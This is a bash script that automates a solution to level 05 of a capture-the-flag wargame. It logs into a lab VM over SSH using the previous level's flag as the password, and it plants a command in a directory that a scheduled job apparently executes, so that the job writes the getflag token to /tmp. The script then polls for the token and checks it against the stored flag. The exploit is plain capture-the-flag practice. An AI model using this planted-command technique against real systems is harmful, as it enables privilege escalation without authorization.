#!/bin/bash

VM_ID='192.168.56.3'
ACTUAL_LEVEL=05
PREVIOUS_LEVEL=$(printf %02d $(( ${ACTUAL_LEVEL} - 1)))

if [ ! -f "../../level${PREVIOUS_LEVEL}/flag" ]; then
    echo "../../level${PREVIOUS_LEVEL}/flag does not exist"
    exit 1
fi

act_level_password=$(cat "../../level${PREVIOUS_LEVEL}/flag")

sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'echo "echo \$(getflag) > /tmp/flag" > /opt/openarenaserver/file' 2> /dev/null

sleep 10

cnt=0
token=""
while [ "$(echo "${token}" | grep --max-count=1 --count 'Check flag.Here is your token : ')" -eq 0 ] && [ "${cnt}" -lt 100 ]
do
    token="$(sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'cat /tmp/flag' 2> /dev/null)"
    sleep 3
    let cnt++
done

token="$(echo "${token}" | grep --color=never 'Check flag.Here is your token : ' | sed 's/Check flag.Here is your token : \(\S\+\)/\1/' | head -n 1)"

echo "found by script:"
echo "${token}"
echo
echo "from level${ACTUAL_LEVEL}/flag:"
cat ../flag

echo "${token}" > tmp_flag
diff ../flag tmp_flag
rm -f tmp_flag
